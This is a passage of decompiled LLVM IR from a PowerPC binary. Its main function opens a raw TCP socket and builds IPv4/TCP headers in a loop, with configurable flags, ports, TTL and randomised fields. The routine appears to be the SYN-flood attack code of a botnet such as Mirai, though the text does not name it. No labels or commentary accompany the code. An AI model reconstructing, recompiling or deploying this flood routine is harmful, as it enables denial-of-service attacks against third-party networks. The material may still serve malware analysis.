  store i1 %v3_10004520, i1* %cr3_eq.global-to-local, align 1
  br label %dec_label_pc_10004388.preheader

dec_label_pc_1000452c:                            ; preds = %dec_label_pc_10004200
  %v0_1000452c = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_1000452c, i32* %r3.global-to-local, align 4
  store i32 268453172, i32* @lr, align 4
  %v0_10004530 = call i32 @function_1000b3f0()
  store i32 %v0_10004530, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10004534

dec_label_pc_10004534:                            ; preds = %dec_label_pc_10003fb0, %dec_label_pc_1000452c
  store i32 %v0_10003fc8, i32* %r0.global-to-local, align 4
  %v1_10004548 = call %0 @__asm_mtcrf(i32 56, i32 %v0_10003fb8)
  store i32 %v0_10004008, i32* %r28.global-to-local, align 4
  store i32 %v0_10004010, i32* %r29.global-to-local, align 4
  store i32 %v0_10004018, i32* %r30.global-to-local, align 4
  %v0_10004590 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10004590

; uselistorder directives
  uselistorder i32 %v0_100044d0, { 1, 0 }
  uselistorder i32 %v0_100044c0, { 1, 0 }
  uselistorder i32 %v0_100044b0, { 1, 0 }
  uselistorder i32 %v1_100044a8, { 1, 0 }
  uselistorder i1 %v1_10004468, { 1, 0 }
  uselistorder i1 %v0_10004468, { 1, 0 }
  uselistorder i32 %v1_10004458, { 0, 2, 3, 1 }
  uselistorder i32 %v4_10004420, { 1, 0 }
  uselistorder i32 %v1_10004294, { 1, 0 }
  uselistorder i32 %v1_1000428c, { 1, 0 }
  uselistorder i32 %v1_10004270, { 1, 0 }
  uselistorder i32 %v1_1000426c, { 1, 0 }
  uselistorder i32 %v1_10004258, { 1, 0 }
  uselistorder i32 %v1_10004254, { 1, 0 }
  uselistorder i32 %v1_10004250, { 2, 1, 0 }
  uselistorder i32 %v1_10004248, { 1, 2, 0, 3 }
  uselistorder i32 %v6_100041dc, { 0, 4, 2, 1, 3 }
  uselistorder i32 %v1_100041c8, { 3, 0, 2, 1 }
  uselistorder i8 %v5_10004048, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 21, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0, 1 }
  uselistorder i32* %r29.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r28.global-to-local, { 0, 9, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 24, 20, 21, 22, 23, 25, 26, 27, 28, 29 }
  uselistorder i1* %cr4_eq.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10004534, { 1, 0 }
  uselistorder label %dec_label_pc_100044fc, { 1, 0 }
  uselistorder label %dec_label_pc_100043f8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000438c, { 1, 0 }
  uselistorder label %dec_label_pc_10004388, { 1, 0 }
  uselistorder label %dec_label_pc_10004388.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000435c, { 1, 0 }
  uselistorder label %dec_label_pc_100042e0, { 1, 0 }
}

define i32 @function_10004594(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10004594:
  %cr2_eq.global-to-local = alloca i1, align 1
  %cr3_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr4_lt.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-120 = alloca i32, align 4
  %v0_10004598 = load i32, i32* @lr, align 4
  store i32 %v0_10004598, i32* %r0.global-to-local, align 4
  %v0_1000459c = call i32 @__asm_mfcr()
  store i32 %v0_1000459c, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r27.global-to-local, align 4
  %v0_100045ac = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1000459c, i32* %r24.global-to-local, align 4
  %v0_100045ec = load i32, i32* @r28, align 4
  store i32 %arg4, i32* @r28, align 4
  %v0_100045f4 = load i32, i32* @r29, align 4
  store i32 %arg3, i32* @r29, align 4
  %v0_10004600 = load i32, i32* @r31, align 4
  store i32 268453384, i32* @lr, align 4
  %v2_10004604 = call i32 @function_1000c548(i32 4, i32 4)
  store i32 %v2_10004604, i32* %r25.global-to-local, align 4
  %v0_1000460c = load i32, i32* @r28, align 4
  %v0_10004618 = load i32, i32* @r29, align 4
  store i32 %v0_10004618, i32* %r3.global-to-local, align 4
  store i32 268453408, i32* @lr, align 4
  %v4_1000461c = inttoptr i32 %v0_1000460c to i32*
  %v5_1000461c = call i32 @function_1000235c(i32 %v0_10004618, i32* %v4_1000461c, i32 2, i32 0)
  %v5_1000462c = trunc i32 %v5_1000461c to i8
  %v0_10004634 = load i32, i32* @r28, align 4
  %v0_10004638 = load i32, i32* @r29, align 4
  store i32 %v0_10004638, i32* %r3.global-to-local, align 4
  store i32 268453440, i32* @lr, align 4
  %v4_1000463c = inttoptr i32 %v0_10004634 to i32*
  %v5_1000463c = call i32 @function_1000235c(i32 %v0_10004638, i32* %v4_1000463c, i32 3, i32 65535)
  %v0_10004640 = load i32, i32* @r28, align 4
  store i32 %v5_1000463c, i32* %r21.global-to-local, align 4
  %v0_10004650 = load i32, i32* @r29, align 4
  store i32 %v0_10004650, i32* %r3.global-to-local, align 4
  store i32 268453464, i32* @lr, align 4
  %v4_10004654 = inttoptr i32 %v0_10004640 to i32*
  %v5_10004654 = call i32 @function_1000235c(i32 %v0_10004650, i32* %v4_10004654, i32 4, i32 64)
  %v0_10004658 = load i32, i32* @r28, align 4
  %v5_10004664 = trunc i32 %v5_10004654 to i8
  %v0_1000466c = load i32, i32* @r29, align 4
  store i32 %v0_1000466c, i32* %r3.global-to-local, align 4
  store i32 268453492, i32* @lr, align 4
  %v4_10004670 = inttoptr i32 %v0_10004658 to i32*
  %v5_10004670 = call i32 @function_1000235c(i32 %v0_1000466c, i32* %v4_10004670, i32 5, i32 1)
  %v0_10004680 = load i32, i32* @r28, align 4
  %v1_10004684 = urem i32 %v5_10004670, 256
  store i32 %v1_10004684, i32* @r31, align 4
  %v0_10004688 = load i32, i32* @r29, align 4
  store i32 %v0_10004688, i32* %r3.global-to-local, align 4
  store i32 268453520, i32* @lr, align 4
  %v4_1000468c = inttoptr i32 %v0_10004680 to i32*
  %v5_1000468c = call i32 @function_1000235c(i32 %v0_10004688, i32* %v4_1000468c, i32 6, i32 65535)
  %v0_10004694 = load i32, i32* @r28, align 4
  store i32 %v5_1000468c, i32* %r22.global-to-local, align 4
  %v0_100046a4 = load i32, i32* @r29, align 4
  store i32 %v0_100046a4, i32* %r3.global-to-local, align 4
  store i32 268453548, i32* @lr, align 4
  %v4_100046a8 = inttoptr i32 %v0_10004694 to i32*
  %v5_100046a8 = call i32 @function_1000235c(i32 %v0_100046a4, i32* %v4_100046a8, i32 7, i32 65535)
  %v0_100046b0 = load i32, i32* @r28, align 4
  store i32 %v5_100046a8, i32* %r23.global-to-local, align 4
  %v0_100046c0 = load i32, i32* @r29, align 4
  store i32 %v0_100046c0, i32* %r3.global-to-local, align 4
  store i32 268453576, i32* @lr, align 4
  %v4_100046c4 = inttoptr i32 %v0_100046b0 to i32*
  %v5_100046c4 = call i32 @function_1000235c(i32 %v0_100046c0, i32* %v4_100046c4, i32 17, i32 65535)
  %v0_100046c8 = load i32, i32* @r28, align 4
  store i32 %v5_100046c4, i32* %r19.global-to-local, align 4
  %v0_100046d8 = load i32, i32* @r29, align 4
  store i32 %v0_100046d8, i32* %r3.global-to-local, align 4
  store i32 268453600, i32* @lr, align 4
  %v4_100046dc = inttoptr i32 %v0_100046c8 to i32*
  %v5_100046dc = call i32 @function_1000235c(i32 %v0_100046d8, i32* %v4_100046dc, i32 18, i32 0)
  %v0_100046e0 = load i32, i32* @r28, align 4
  store i32 %v5_100046dc, i32* %r20.global-to-local, align 4
  %v0_100046f0 = load i32, i32* @r29, align 4
  store i32 %v0_100046f0, i32* %r3.global-to-local, align 4
  store i32 268453624, i32* @lr, align 4
  %v4_100046f4 = inttoptr i32 %v0_100046e0 to i32*
  %v5_100046f4 = call i32 @function_1000235c(i32 %v0_100046f0, i32* %v4_100046f4, i32 11, i32 0)
  %v0_100046f8 = load i32, i32* @r28, align 4
  store i32 %v5_100046f4, i32* %r14.global-to-local, align 4
  %v0_10004708 = load i32, i32* @r29, align 4
  store i32 %v0_10004708, i32* %r3.global-to-local, align 4
  store i32 268453648, i32* @lr, align 4
  %v4_1000470c = inttoptr i32 %v0_100046f8 to i32*
  %v5_1000470c = call i32 @function_1000235c(i32 %v0_10004708, i32* %v4_1000470c, i32 12, i32 0)
  %v0_10004710 = load i32, i32* @r28, align 4
  store i32 %v5_1000470c, i32* %r17.global-to-local, align 4
  %v0_10004720 = load i32, i32* @r29, align 4
  store i32 %v0_10004720, i32* %r3.global-to-local, align 4
  store i32 268453672, i32* @lr, align 4
  %v4_10004724 = inttoptr i32 %v0_10004710 to i32*
  %v5_10004724 = call i32 @function_1000235c(i32 %v0_10004720, i32* %v4_10004724, i32 13, i32 0)
  %v0_10004728 = load i32, i32* @r28, align 4
  store i32 %v5_10004724, i32* %r18.global-to-local, align 4
  %v0_10004738 = load i32, i32* @r29, align 4
  store i32 %v0_10004738, i32* %r3.global-to-local, align 4
  store i32 268453696, i32* @lr, align 4
  %v4_1000473c = inttoptr i32 %v0_10004728 to i32*
  %v5_1000473c = call i32 @function_1000235c(i32 %v0_10004738, i32* %v4_1000473c, i32 14, i32 0)
  %v0_10004740 = load i32, i32* @r28, align 4
  %v0_10004750 = load i32, i32* @r29, align 4
  store i32 %v0_10004750, i32* %r3.global-to-local, align 4
  store i32 268453720, i32* @lr, align 4
  %v4_10004754 = inttoptr i32 %v0_10004740 to i32*
  %v5_10004754 = call i32 @function_1000235c(i32 %v0_10004750, i32* %v4_10004754, i32 15, i32 1)
  %v0_10004758 = load i32, i32* @r28, align 4
  store i32 %v5_10004754, i32* %r16.global-to-local, align 4
  %v0_10004768 = load i32, i32* @r29, align 4
  store i32 %v0_10004768, i32* %r3.global-to-local, align 4
  store i32 268453744, i32* @lr, align 4
  %v4_1000476c = inttoptr i32 %v0_10004758 to i32*
  %v5_1000476c = call i32 @function_1000235c(i32 %v0_10004768, i32* %v4_1000476c, i32 16, i32 0)
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_10004774 = load i32, i32* @global_var_1001eb10.71, align 4
  %v0_10004778 = load i32, i32* @r28, align 4
  store i32 %v5_1000476c, i32* %r30.global-to-local, align 4
  %v0_10004784 = load i32, i32* @r29, align 4
  store i32 %v0_10004784, i32* %r3.global-to-local, align 4
  store i32 268453772, i32* @lr, align 4
  %v5_10004788 = inttoptr i32 %v0_10004778 to i32*
  %v6_10004788 = call i32 @function_100022dc(i32 %v0_10004784, i32* %v5_10004788, i32 25, i32 %v3_10004774, i32 268566528)
  store i32 %v6_10004788, i32* %r15.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268453792, i32* @lr, align 4
  %v3_1000479c = call i32 @function_1000c1bc(i32 2, i32 3, i32 6)
  store i32 %v3_1000479c, i32* %r3.global-to-local, align 4
  %v3_100047a0 = icmp eq i32 %v3_1000479c, -1
  store i32 %v3_1000479c, i32* %r26.global-to-local, align 4
  br i1 %v3_100047a0, label %dec_label_pc_10004ad8, label %dec_label_pc_100047ac

dec_label_pc_100047ac:                            ; preds = %dec_label_pc_10004594
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_100047b8 = ptrtoint i32* %stack_var_-120 to i32
  store i32 4, i32* %r7.global-to-local, align 4
  store i32 1, i32* %stack_var_-120, align 4
  store i32 268453832, i32* @lr, align 4
  %v5_100047c4 = call i32 @function_1000c180(i32 0, i32 3, i32 %v2_100047b8, i32 4, i32 4)
  store i32 %v5_100047c4, i32* %r3.global-to-local, align 4
  %v3_100047c8 = icmp eq i32 %v5_100047c4, -1
  br i1 %v3_100047c8, label %dec_label_pc_10004ad0, label %dec_label_pc_100047d0

dec_label_pc_100047d0:                            ; preds = %dec_label_pc_100047ac
  %v0_100047d0 = load i32, i32* %r24.global-to-local, align 4
  %v1_100047d0 = icmp slt i32 %v0_100047d0, 0
  %v3_100047d0 = icmp eq i32 %v0_100047d0, 0
  store i1 %v1_100047d0, i1* %cr4_lt.global-to-local, align 1
  store i1 %v3_100047d0, i1* %cr4_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-120, align 4
  %v0_100047dc = load i32, i32* %r21.global-to-local, align 4
  %v1_100047dc = urem i32 %v0_100047dc, 65536
  store i32 %v1_100047dc, i32* %r21.global-to-local, align 4
  %v0_100047e0 = load i32, i32* %r22.global-to-local, align 4
  %v1_100047e0 = urem i32 %v0_100047e0, 65536
  store i32 %v1_100047e0, i32* %r22.global-to-local, align 4
  %v0_100047e4 = load i32, i32* %r23.global-to-local, align 4
  %v1_100047e4 = urem i32 %v0_100047e4, 65536
  store i32 %v1_100047e4, i32* %r23.global-to-local, align 4
  %v0_100047e8 = load i32, i32* %r14.global-to-local, align 4
  %v1_100047e8 = urem i32 %v0_100047e8, 256
  store i32 %v1_100047e8, i32* %r14.global-to-local, align 4
  %tmp40 = icmp slt i32 %v0_100047d0, 1
  br i1 %tmp40, label %dec_label_pc_1000494c, label %dec_label_pc_100047f0

dec_label_pc_100047f0:                            ; preds = %dec_label_pc_100047d0
  store i32 %v5_1000473c, i32* %r0.global-to-local, align 4
  %v0_100047f4 = load i32, i32* @r31, align 4
  %v3_100047f4 = icmp eq i32 %v0_100047f4, 0
  store i1 %v3_100047f4, i1* %cr3_eq.global-to-local, align 1
  %v0_100047f8 = load i32, i32* %r16.global-to-local, align 4
  %v1_100047f8 = urem i32 %v0_100047f8, 2
  store i32 %v1_100047f8, i32* %r29.global-to-local, align 4
  %v0_100047fc = load i32, i32* %r17.global-to-local, align 4
  %v1_100047fc = urem i32 %v0_100047fc, 2
  store i32 %v1_100047fc, i32* %r17.global-to-local, align 4
  %v0_10004800 = load i32, i32* %r18.global-to-local, align 4
  %v1_10004800 = urem i32 %v0_10004800, 2
  store i32 %v1_10004800, i32* %r18.global-to-local, align 4
  %v1_10004804 = urem i32 %v5_1000473c, 2
  store i32 %v1_10004804, i32* %r28.global-to-local, align 4
  %v0_10004808 = load i32, i32* %r30.global-to-local, align 4
  %v1_10004808 = urem i32 %v0_10004808, 2
  store i32 %v1_10004808, i32* %r30.global-to-local, align 4
  %v1_1000480c = urem i32 %v0_100047e8, 2
  store i32 %v1_1000480c, i32* %r16.global-to-local, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  %v4_1000485c = sext i8 %v5_1000462c to i32
  %v4_10004864 = sext i8 %v5_10004664 to i32
  br label %dec_label_pc_10004814

dec_label_pc_10004814:                            ; preds = %dec_label_pc_10004878, %dec_label_pc_100047f0
  store i32 128, i32* %r3.global-to-local, align 4
  store i32 268453920, i32* @lr, align 4
  %v2_1000481c = call i32 @function_1000c548(i32 128, i32 1)
  store i32 %v2_1000481c, i32* %r3.global-to-local, align 4
  %v3_10004820 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_10004820, i32* %r9.global-to-local, align 4
  %v0_10004824 = load i32, i32* @r31, align 4
  %v1_10004824 = mul i32 %v0_10004824, 4
  store i32 %v1_10004824, i32* %r0.global-to-local, align 4
  %v1_10004828 = load i32, i32* %r25.global-to-local, align 4
  %v3_10004828 = add i32 %v1_10004828, %v1_10004824
  %v4_10004828 = inttoptr i32 %v3_10004828 to i32*
  store i32 %v2_1000481c, i32* %v4_10004828, align 4
  %v0_1000482c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000482c = mul i32 %v0_1000482c, 4
  store i32 %v1_1000482c, i32* %r9.global-to-local, align 4
  %v1_10004830 = load i32, i32* %r25.global-to-local, align 4
  %v2_10004830 = add i32 %v1_10004830, %v1_1000482c
  %v3_10004830 = inttoptr i32 %v2_10004830 to i32*
  %v4_10004830 = load i32, i32* %v3_10004830, align 4
  store i32 %v4_10004830, i32* %r31.global-to-local, align 4
  store i32 4, i32* %r9.global-to-local, align 4
  %v1_10004838 = inttoptr i32 %v4_10004830 to i32*
  %v2_10004838 = load i32, i32* %v1_10004838, align 4
  store i32 %v2_10004838, i32* %r0.global-to-local, align 4
  %v1_1000483c = add i32 %v4_10004830, 20
  store i32 %v1_1000483c, i32* %r11.global-to-local, align 4
  %v0_10004840 = load i32, i32* %r21.global-to-local, align 4
  %v1_10004840 = trunc i32 %v0_10004840 to i16
  %v3_10004840 = add i32 %v4_10004830, 4
  %v4_10004840 = inttoptr i32 %v3_10004840 to i16*
  store i16 %v1_10004840, i16* %v4_10004840, align 2
  %v1_10004844 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10004844, i32* %r0.global-to-local, align 4
  store i32 5, i32* %r9.global-to-local, align 4
  %v1_1000484c = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 60, i32* %r9.global-to-local, align 4
  %v1_10004854 = load i32, i32* %r31.global-to-local, align 4
  %v2_10004854 = inttoptr i32 %v1_10004854 to i32*
  store i32 %v1_1000484c, i32* %v2_10004854, align 4
  %v0_10004858 = load i32, i32* %r9.global-to-local, align 4
  %v1_10004858 = trunc i32 %v0_10004858 to i16
  %v2_10004858 = load i32, i32* %r31.global-to-local, align 4
  %v3_10004858 = add i32 %v2_10004858, 2
  %v4_10004858 = inttoptr i32 %v3_10004858 to i16*
  store i16 %v1_10004858, i16* %v4_10004858, align 2
  store i32 %v4_1000485c, i32* %r0.global-to-local, align 4
  %v2_10004860 = load i32, i32* %r31.global-to-local, align 4
  %v3_10004860 = add i32 %v2_10004860, 1
  %v4_10004860 = inttoptr i32 %v3_10004860 to i8*
  store i8 %v5_1000462c, i8* %v4_10004860, align 1
  store i32 %v4_10004864, i32* %r9.global-to-local, align 4
  %v2_10004868 = load i32, i32* %r31.global-to-local, align 4
  %v3_10004868 = add i32 %v2_10004868, 8
  %v4_10004868 = inttoptr i32 %v3_10004868 to i8*
  store i8 %v5_10004664, i8* %v4_10004868, align 1
  %v0_1000486c = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_1000486c, label %dec_label_pc_10004878, label %dec_label_pc_10004870

dec_label_pc_10004870:                            ; preds = %dec_label_pc_10004814
  store i32 16384, i32* %r0.global-to-local, align 4
  %v2_10004874 = load i32, i32* %r31.global-to-local, align 4
  %v3_10004874 = add i32 %v2_10004874, 6
  %v4_10004874 = inttoptr i32 %v3_10004874 to i16*
  store i16 16384, i16* %v4_10004874, align 2
  br label %dec_label_pc_10004878

dec_label_pc_10004878:                            ; preds = %dec_label_pc_10004814, %dec_label_pc_10004870
  store i32 6, i32* %r0.global-to-local, align 4
  %v0_1000487c = load i32, i32* %r15.global-to-local, align 4
  %v1_1000487c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000487c = add i32 %v1_1000487c, 12
  %v3_1000487c = inttoptr i32 %v2_1000487c to i32*
  store i32 %v0_1000487c, i32* %v3_1000487c, align 4
  %v0_10004880 = load i32, i32* %r0.global-to-local, align 4
  %v1_10004880 = trunc i32 %v0_10004880 to i8
  %v2_10004880 = load i32, i32* %r31.global-to-local, align 4
  %v3_10004880 = add i32 %v2_10004880, 9
  %v4_10004880 = inttoptr i32 %v3_10004880 to i8*
  store i8 %v1_10004880, i8* %v4_10004880, align 1
  %v0_10004884 = load i32, i32* %r22.global-to-local, align 4
  %v1_10004884 = trunc i32 %v0_10004884 to i16
  %v2_10004884 = load i32, i32* %r31.global-to-local, align 4
  %v3_10004884 = add i32 %v2_10004884, 20
  %v4_10004884 = inttoptr i32 %v3_10004884 to i16*
  store i16 %v1_10004884, i16* %v4_10004884, align 2
  %v3_10004888 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_10004888, i32* %r9.global-to-local, align 4
  %v0_1000488c = load i32, i32* %r23.global-to-local, align 4
  %v1_1000488c = trunc i32 %v0_1000488c to i16
  %v2_1000488c = load i32, i32* %r11.global-to-local, align 4
  %v3_1000488c = add i32 %v2_1000488c, 2
  %v4_1000488c = inttoptr i32 %v3_1000488c to i16*
  store i16 %v1_1000488c, i16* %v4_1000488c, align 2
  %v0_10004890 = load i32, i32* %r9.global-to-local, align 4
  %v1_10004890 = mul i32 %v0_10004890, 24
  %v1_10004894 = load i32, i32* %r27.global-to-local, align 4
  %v2_10004894 = add i32 %v1_10004894, %v1_10004890
  store i32 %v2_10004894, i32* %r9.global-to-local, align 4
  %v1_10004898 = add i32 %v2_10004894, 16
  %v2_10004898 = inttoptr i32 %v1_10004898 to i32*
  %v3_10004898 = load i32, i32* %v2_10004898, align 4
  store i32 %v3_10004898, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r9.global-to-local, align 4
  %v1_100048a0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100048a0 = add i32 %v1_100048a0, 16
  %v3_100048a0 = inttoptr i32 %v2_100048a0 to i32*
  store i32 %v3_10004898, i32* %v3_100048a0, align 4
  %v0_100048a4 = load i32, i32* %r19.global-to-local, align 4
  %v1_100048a4 = load i32, i32* %r11.global-to-local, align 4
  %v2_100048a4 = add i32 %v1_100048a4, 4
  %v3_100048a4 = inttoptr i32 %v2_100048a4 to i32*
  store i32 %v0_100048a4, i32* %v3_100048a4, align 4
  %v0_100048a8 = load i32, i32* %r11.global-to-local, align 4
  %v1_100048a8 = add i32 %v0_100048a8, 12
  %v2_100048a8 = inttoptr i32 %v1_100048a8 to i32*
  %v3_100048a8 = load i32, i32* %v2_100048a8, align 4
  store i32 %v3_100048a8, i32* %r0.global-to-local, align 4
  %v1_100048ac = call i32 @__asm_rlwimi(i32 10, i32 28, i32 0, i32 3)
  store i32 %v1_100048ac, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r9.global-to-local, align 4
  %v1_100048b4 = call i32 @__asm_rlwimi(i32 %v1_1000480c, i32 21, i32 10, i32 10)
  store i32 %v1_100048b4, i32* %r0.global-to-local, align 4
  %v1_100048b8 = call i32 @__asm_rlwimi(i32 %v1_100047fc, i32 20, i32 11, i32 11)
  store i32 %v1_100048b8, i32* %r0.global-to-local, align 4
  %v1_100048bc = call i32 @__asm_rlwimi(i32 %v1_10004800, i32 19, i32 12, i32 12)
  store i32 %v1_100048bc, i32* %r0.global-to-local, align 4
  %v1_100048c0 = call i32 @__asm_rlwimi(i32 %v1_10004804, i32 18, i32 13, i32 13)
  store i32 %v1_100048c0, i32* %r0.global-to-local, align 4
  %v1_100048c4 = call i32 @__asm_rlwimi(i32 %v1_100047f8, i32 17, i32 14, i32 14)
  store i32 %v1_100048c4, i32* %r0.global-to-local, align 4
  %v1_100048c8 = call i32 @__asm_rlwimi(i32 %v1_10004808, i32 16, i32 15, i32 15)
  %v1_100048cc = load i32, i32* %r11.global-to-local, align 4
  %v2_100048cc = add i32 %v1_100048cc, 12
  %v3_100048cc = inttoptr i32 %v2_100048cc to i32*
  store i32 %v1_100048c8, i32* %v3_100048cc, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_100048d4 = load i32, i32* %r31.global-to-local, align 4
  %v3_100048d4 = add i32 %v2_100048d4, 40
  %v4_100048d4 = inttoptr i32 %v3_100048d4 to i8*
  store i8 2, i8* %v4_100048d4, align 1
  %v0_100048d8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100048d8 = trunc i32 %v0_100048d8 to i8
  %v2_100048d8 = load i32, i32* %r31.global-to-local, align 4
  %v3_100048d8 = add i32 %v2_100048d8, 41
  %v4_100048d8 = inttoptr i32 %v3_100048d8 to i8*
  store i8 %v1_100048d8, i8* %v4_100048d8, align 1
  %v0_100048dc = call i32 @function_10007ca8()
  %v2_100048e4 = load i32, i32* %r31.global-to-local, align 4
  %v3_100048e4 = add i32 %v2_100048e4, 46
  %v4_100048e4 = inttoptr i32 %v3_100048e4 to i8*
  store i8 8, i8* %v4_100048e4, align 1
  %v1_100048e8 = urem i32 %v0_100048dc, 16
  store i32 %v1_100048e8, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r9.global-to-local, align 4
  %v2_100048f4 = load i32, i32* %r31.global-to-local, align 4
  %v3_100048f4 = add i32 %v2_100048f4, 44
  %v4_100048f4 = inttoptr i32 %v3_100048f4 to i8*
  store i8 4, i8* %v4_100048f4, align 1
  %v0_100048f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_100048f8 = add i32 %v0_100048f8, 1400
  store i32 %v1_100048f8, i32* %r3.global-to-local, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_10004900 = load i32, i32* %r9.global-to-local, align 4
  %v1_10004900 = trunc i32 %v0_10004900 to i8
  %v2_10004900 = load i32, i32* %r31.global-to-local, align 4
  %v3_10004900 = add i32 %v2_10004900, 45
  %v4_10004900 = inttoptr i32 %v3_10004900 to i8*
  store i8 %v1_10004900, i8* %v4_10004900, align 1
  %v0_10004904 = load i32, i32* %r0.global-to-local, align 4
  %v1_10004904 = trunc i32 %v0_10004904 to i8
  %v2_10004904 = load i32, i32* %r31.global-to-local, align 4
  %v3_10004904 = add i32 %v2_10004904, 47
  %v4_10004904 = inttoptr i32 %v3_10004904 to i8*
  store i8 %v1_10004904, i8* %v4_10004904, align 1
  %v0_10004908 = load i32, i32* %r3.global-to-local, align 4
  %v1_10004908 = trunc i32 %v0_10004908 to i16
  %v2_10004908 = load i32, i32* %r31.global-to-local, align 4
  %v3_10004908 = add i32 %v2_10004908, 42
  %v4_10004908 = inttoptr i32 %v3_10004908 to i16*
  store i16 %v1_10004908, i16* %v4_10004908, align 2
  %v0_1000490c = call i32 @function_10007ca8()
  store i32 %v0_1000490c, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  %v1_10004918 = load i32, i32* %r31.global-to-local, align 4
  %v2_10004918 = add i32 %v1_10004918, 52
  %v3_10004918 = inttoptr i32 %v2_10004918 to i32*
  store i32 0, i32* %v3_10004918, align 4
  %v0_1000491c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000491c = trunc i32 %v0_1000491c to i8
  %v2_1000491c = load i32, i32* %r31.global-to-local, align 4
  %v3_1000491c = add i32 %v2_1000491c, 56
  %v4_1000491c = inttoptr i32 %v3_1000491c to i8*
  store i8 %v1_1000491c, i8* %v4_1000491c, align 1
  store i32 6, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r9.global-to-local, align 4
  %v1_10004928 = load i32, i32* %r31.global-to-local, align 4
  %v2_10004928 = add i32 %v1_10004928, 48
  %v3_10004928 = inttoptr i32 %v2_10004928 to i32*
  store i32 %v0_1000490c, i32* %v3_10004928, align 4
  %v0_1000492c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000492c = trunc i32 %v0_1000492c to i8
  %v2_1000492c = load i32, i32* %r31.global-to-local, align 4
  %v3_1000492c = add i32 %v2_1000492c, 59
  %v4_1000492c = inttoptr i32 %v3_1000492c to i8*
  store i8 %v1_1000492c, i8* %v4_1000492c, align 1
  %v0_10004930 = load i32, i32* %r9.global-to-local, align 4
  %v1_10004930 = trunc i32 %v0_10004930 to i8
  %v2_10004930 = load i32, i32* %r31.global-to-local, align 4
  %v3_10004930 = add i32 %v2_10004930, 57
  %v4_10004930 = inttoptr i32 %v3_10004930 to i8*
  store i8 %v1_10004930, i8* %v4_10004930, align 1
  %v0_10004934 = load i32, i32* %r9.global-to-local, align 4
  %v1_10004934 = trunc i32 %v0_10004934 to i8
  %v2_10004934 = load i32, i32* %r31.global-to-local, align 4
  %v3_10004934 = add i32 %v2_10004934, 58
  %v4_10004934 = inttoptr i32 %v3_10004934 to i8*
  store i8 %v1_10004934, i8* %v4_10004934, align 1
  %v3_10004938 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_10004938, i32* %r9.global-to-local, align 4
  %v1_1000493c = add i32 %v3_10004938, 1
  store i32 %v1_1000493c, i32* %r31.global-to-local, align 4
  %v1_10004940 = load i32, i32* %r24.global-to-local, align 4
  %v2_10004940 = icmp slt i32 %v1_1000493c, %v1_10004940
  store i32 %v1_1000493c, i32* %stack_var_-120, align 4
  br i1 %v2_10004940, label %dec_label_pc_10004814, label %dec_label_pc_1000494c.loopexit

dec_label_pc_1000494c.loopexit:                   ; preds = %dec_label_pc_10004878
  %v0_10004950.pre = load i32, i32* %r14.global-to-local, align 4
  %v0_10004954.pre.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_10004954.pre.pre = load i1, i1* %cr4_lt.global-to-local, align 1
